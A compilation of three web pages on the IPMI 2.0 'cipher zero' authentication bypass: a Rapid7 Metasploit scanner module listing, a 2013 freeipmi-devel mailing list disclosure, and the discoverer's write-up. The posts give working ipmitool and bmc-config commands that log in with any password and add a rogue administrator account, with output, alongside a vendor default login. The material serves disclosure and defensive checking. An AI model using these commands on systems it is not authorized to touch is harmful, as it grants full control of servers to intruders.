=== Content from www.metasploit.com_d0784a61_20250125_230419.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
  + [日本語](/ja/db/modules/)
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg) Sign In](https://insight.rapid7.com/saml/SSO)
[Contact us](/contact/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
  + [日本語](/ja/db/modules/)
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

[Contact us](/contact/)

* [Home](/)
* [Vulnerability & Exploit Database](/db/)
* **Modules**

#### Rapid7 Vulnerability & Exploit Database

# IPMI 2.0 Cipher Zero Authentication Bypass Scanner

 [Back to Search](https://www.rapid7.com/db/)

### IPMI 2.0 Cipher Zero Authentication Bypass Scanner

Disclosed
06/20/2013

Created
05/30/2018

#### Description

This module identifies IPMI 2.0-compatible systems that are vulnerable
to an authentication bypass vulnerability through the use of cipher
zero.

#### Author(s)

* Dan Farmer <zen@fish2.com>
* hdm <x@hdm.io>

#### Development

* [Source Code](https://github.com/rapid7/metasploit-framework/blob/master//modules/auxiliary/scanner/ipmi/ipmi_cipher_zero.rb)
* [History](https://github.com/rapid7/metasploit-framework/commits/master//modules/auxiliary/scanner/ipmi/ipmi_cipher_zero.rb)

#### Module Options

To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':

```
msf > use auxiliary/scanner/ipmi/ipmi_cipher_zero
msf auxiliary(ipmi_cipher_zero) > show actions
    ...actions...
msf auxiliary(ipmi_cipher_zero) > set ACTION < action-name >
msf auxiliary(ipmi_cipher_zero) > show options
    ...show and set options...
msf auxiliary(ipmi_cipher_zero) > run
```

### Metasploit

Penetration testing software for offensive security teams.

Key Features

* [Collect and share all the information you need to conduct a successful and efficient penetration test](/products/metasploit/features)
* [Simulate complex attacks against your systems and users](/products/metasploit/features)
* [Test your defenses to make sure they’re ready](/products/metasploit/features)
* [Automate Every Step of Your Penetration Test](/products/metasploit/features)

[Free Metasploit Pro Trial](/try/metasploit-pro/)
[View All Features](/products/metasploit/features/)

Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.

– Jim O’Gorman | President, Offensive Security

;

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

© Rapid7
[Legal Terms](/legal/)
  |   [Privacy Policy](/privacy-policy/)
  |   [Export Notice](/export-notice/)
  |   [Trust](/trust/)
  |   Do Not Sell or Share My Personal Information
  |   Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1–866–390–8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)



=== Content from lists.gnu.org_e7d8e63f_20250125_230420.html ===


| | **freeipmi-devel** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=freeipmi-devel)

---

[[Date Prev](msg00012.html)][[Date Next](msg00014.html)][[Thread Prev](msg00001.html)][[Thread Next](msg00014.html)][[Date Index](index.html#00013)][[Thread Index](threads.html#00013)]

## [Freeipmi-devel] The Infamous Cipher Zero, I presume?

---

| **From**: | dan farmer |
| --- | --- |

| **Subject**: | [Freeipmi-devel] The Infamous Cipher Zero, I presume? |
| **Date**: | Fri, 22 Feb 2013 07:53:26 -0800 |

---

```

Many may know thisâ¦ but it came as a bit of news to me to actually *see* it in
the wild.  I came across this while working on my little audit tool of the
config stuff I'd posted here.

The short version - everyone here probably knows that Cipher Zero is the first
Cipher in the IPMI 2.0 spec.  It allows you to authenticate to IPMI without a
password - in other words, it's really no cipher at all, or the un-cipher.  It
removes all security from IPMI.  But who cares, really?  Surely vendors
wouldn't turn this on by default, would they?  Wellâ¦ it's enabled on my Dell
(iDRAC 6), HP (iLO 3), and Supermicro.  That's all the systems I have access
to, presumably there are more.

Longer version: let's see, to belabor the obvious, to execute an IPMI command,
you can use good ol' bmc-config with the proper authentication:

        $ bmc-config -D LAN_2_0 -I 0  -v -u root -p calvin -h 10.0.0.1
--checkout|grep -i cipher_suite_id_0
        Maximum_Privilege_Cipher_Suite_Id_0           Administrator

You know, that line of output is not good. How not good is "not good"? Well,
let's try it again... this time with "FluffyWabbit" as the password:

        $ bmc-config -D LAN_2_0 -I 0  -v -u root -p FluffyWabbit -h 10.0.0.1
--checkout|grep -i cipher_suite_id_0
        Maximum_Privilege_Cipher_Suite_Id_0           Administrator

I guess this is neat. Or sad.  Or something.  You can try other passwords to
verify FluffyWabbit isn't some vendor hardcoded backdoor ;)

I believe that IBM, as of the M2/Nehalem generation, has essentially abolished
cipher zero through the efforts of Jarred B Johnson (kudos to both!) I'm not
sure who else still has this going onâ¦ but you might check your own boxes.  I'd
love to hear about the vendors that do have this on or off by default.

Disclaimer - various versions of the IPMI utilities - including bmc-config -
do not work correctly with cipher 0 and will fail; this misled me early on in
testing my own boxes. The latest version of freeipmi seems to work on all the
ones I've tested, at least; make sure you have downloaded the latest copy and
try this to verify good ol' cipher 0 is still around.

Most commands say they support cipher zero, but ensure you have the latest
version, because bugs abound out there in the tools and/or in the BMCs.  Here's
a couple of more ways to see if this is enabled:

        $ ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit lan
print

        $ ipmiutil lan  -J 0  -N 10.0.0.1 -U admin -P FluffyBunny

Ipmiutil has a nice printing of the results - anything in the RMCP+ line that
looks zero-ish is bad :)

     $ ipmitool -I lanplus -C 0 -H 10.0.0.1 -U root -P calvin  lan print
      Set in Progress         : Set Complete
      Auth Type Support       : NONE MD2 MD5 PASSWORD
      Auth Type Enable        : Callback : MD2 MD5
                              : User     : MD2 MD5
                              : Operator : MD2 MD5
                              : Admin    : MD2 MD5
                              : OEM      :
      IP Address Source       : Static Address
      IP Address              : 192.168.0.23
      Subnet Mask             : 255.255.255.0
      MAC Address             : 14:fe:b5:c7:df:28
      SNMP Community String   : public
      IP Header               : TTL=0x40 Flags=0x40 Precedence=0x00 TOS=0x10
      Default Gateway IP      : 192.168.0.1
      Default Gateway MAC     : 00:00:00:00:00:00
      Backup Gateway IP       : 0.0.0.0
      Backup Gateway MAC      : 00:00:00:00:00:00
      802.1q VLAN ID          : Disabled
      802.1q VLAN Priority    : 0
      RMCP+ Cipher Suites     : 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14
      Cipher Suite Priv Max   : aaaaaaaaaaaaaaa
                              :     X=Cipher Suite Unused
                              :     c=CALLBACK
                              :     u=USER
                              :     o=OPERATOR
                              :     a=ADMIN
                              :     O=OEM

-- d

^..^

```

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [[Next in Thread](msg00014.html)] |
| --- | --- | --- |

* **[Freeipmi-devel] The Infamous Cipher Zero, I presume?**,
  *dan farmer* **<=**
  + **[Re: [Freeipmi-devel] The Infamous Cipher Zero, I presume?](msg00014.html)**, *Albert Chu*, 2013/02/22
    - **[Re: [Freeipmi-devel] The Infamous Cipher Zero, I presume?](msg00015.html)**, *dan farmer*, 2013/02/22

---

* Prev by Date:
  **[Re: [Freeipmi-devel] ipmi configuration security best practices](msg00012.html)**
* Next by Date:
  **[Re: [Freeipmi-devel] The Infamous Cipher Zero, I presume?](msg00014.html)**
* Previous by thread:
  **[[Freeipmi-devel] question about SNMP](msg00001.html)**
* Next by thread:
  **[Re: [Freeipmi-devel] The Infamous Cipher Zero, I presume?](msg00014.html)**
* Index(es):
  + [**Date**](index.html#00013)
  + [**Thread**](threads.html#00013)



=== Content from fish2.com_8dc3b937_20250125_230416.html ===


* [IPMI](/ipmi)
* [trouble](http://trouble.org)
* [security](/security)

The Brain-Death in the IPMI Specification

The Infamous Cipher 0

It's hard to imagine someone thinking this up. The IPMI 2.0 Specification
introduced cryptography into IPMI. Perhaps someone thought... well,
cryptography is hard. So let's put in a way to completely sidestep not
only cryptography, but authentication as well. This is the essence
of cipher zero - it's really no cipher at all, or the un-cipher.
It does require IPMI is turned on, as well as a valid account that can
be authenticated to, you simply don't need the authentication. Vendors
always have a default account, however, so that makes things a bit easier.

So let's see, to belabor the obvious, to execute an IPMI command, you
can use good ol' bmc-config with the proper authentication:
$ **bmc-config -D LAN\_2\_0 -I 0 -v -u root -p calvin -h 10.0.0.1 --checkout|grep -i cipher\_suite\_id\_0**

Maximum\_Privilege\_Cipher\_Suite\_Id\_0 Administrator

You know, that line of output is not good. How not good is "not good"? Well, let's try it again... this time with "FluffyWabbit" as the password:

$ **bmc-config -D LAN\_2\_0 -I 0 -v -u root -p FluffyWabbit -h 10.0.0.1 --checkout|grep -i cipher\_suite\_id\_0**

Maximum\_Privilege\_Cipher\_Suite\_Id\_0 Administrator

I guess this is neat. Or sad. Or something. You can try other passwords
to verify FluffyWabbit isn't some vendor hardcoded backdoor ;)

That said, so what? What's the worst that can happen? Ok... well,
let's try this on my Dell iDRAC. It has an account called root, and
a password that we don't know.

# this shouldn't work

$ **ipmitool -H 10.0.0.1 -U root -P calvin chassis status**

Activate Session command failed

Error: Unable to establish LAN session

Error sending Get Self Test command

# this really shouldn't either, but does.

$ **ipmitool -I lanplus -C 0 -H 10.0.0.1 -U root -P FluffyWabbit chassis status**

Note you have to explicitly say you want version 2 (e.g. lanplus, in this case),
as well as cipher zero ("-C 0".)

Still unimpressed, I know. Well, onwards. Let's create an IPMI account,
give it a password, administrator rights, and enable it. I'll use both
ipmitool and bmc-config; the former is great for illustrating settings,
while the latter is very simple to understand the output.

# one account is there now

**ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit user list**

ID Name Callin Link Auth IPMI Msg Channel Priv Limit

2 admin true true true ADMINISTRATOR

$ **cat bozo.txt**

# add a user with administrative rights

Section User9

Username bozo

Password theclown

Enable\_User Yes

Lan\_Enable\_IPMI\_Msgs Yes

Lan\_Enable\_Link\_Auth Yes

Lan\_Enable\_Restricted\_to\_Callback No

Lan\_Privilege\_Limit Administrator

SOL\_Payload\_Access Yes

Serial\_Enable\_IPMI\_Msgs Yes

Serial\_Enable\_Link\_Auth Yes

Serial\_Enable\_Restricted\_to\_Callback No

Serial\_Privilege\_Limit Administrator

EndSection

# et tu, bmc-config?

$ **bmc-config -v -u root -p calvin -h 10.0.0.1 --commit -f bozo.txt**

# voila

$**ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit user list**

ID Name Callin Link Auth IPMI Msg Channel Priv Limit

2 admin true true true ADMINISTRATOR

9 bozo true true true ADMINISTRATOR

# take the new account out for a test drive; no cheating with C0 this time

$**ipmitool -H 10.0.0.1 -U bozo -P theclown user list**

ID Name Callin Link Auth IPMI Msg Channel Priv Limit

2 admin true true true ADMINISTRATOR

9 bozo true true true ADMINISTRATOR

Since IPMI administrative access grants you god powers on the server,
it's a bit problematic that it's so easy to get admin rights.

I believe that IBM, as of the M2/Nehalem generation, has essentially
abolished cipher zero through the efforts of Jarred B Johnson (kudos
to both!) Dell told me that it was no longer on by default in the most
recent version of iDRAC. I'm not sure who else still has this going on -
but you might check your own boxes. Drop me a line if you hear your
vendor has this on or off by default.

#### Disclaimer

Various versions of the IPMI utilities - including bmc-config - do not
work correctly with cipher 0 and will fail; this misled me early on in
testing my own boxes. The latest version of freeipmi seems to work on
all the ones I've tested, at least; make sure you have downloaded the
latest copy and try this to verify good ol' cipher 0 is still around.
Most commands say they support cipher zero, but ensure you have the
latest version, because bugs abound out there in the tools and/or in
the BMCs. Here's a couple of more ways to see if this is enabled:

$ **ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit lan print**

$ **ipmiutil lan -J 0 -N 10.0.0.1 -U admin -P FluffyBunny**

Ipmiutil has a nice printing of the results - anything in the RMCP+
line (in red below) looks zero-ish is bad :) Cipher Privs refers to the
maximum privilege the account can have using a given cipher suite.

$ **ipmitool -I lanplus -C 0 -H 10.0.0.1 -U root -P calvin lan print**

Set in Progress : Set Complete

Auth Type Support : NONE MD2 MD5 PASSWORD

Auth Type Enable : Callback : MD2 MD5

: User : MD2 MD5

: Operator : MD2 MD5

: Admin : MD2 MD5

: OEM :

IP Address Source : Static Address

IP Address : 10.0.0.1

Subnet Mask : 255.255.255.0

MAC Address : 14:fe:b5:c7:df:28

SNMP Community String : public

IP Header : TTL=0x40 Flags=0x40 Precedence=0x00 TOS=0x10

Default Gateway IP : 192.168.0.1

Default Gateway MAC : 00:00:00:00:00:00

Backup Gateway IP : 0.0.0.0

Backup Gateway MAC : 00:00:00:00:00:00

802.1q VLAN ID : Disabled

802.1q VLAN Priority : 0

RMCP+ Cipher Suites : 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14

Cipher Suite Priv Max : aaaaaaaaaaaaaaaa

: X=Cipher Suite Unused

: c=CALLBACK

: u=USER

: o=OPERATOR

: a=ADMIN

: O=OEM


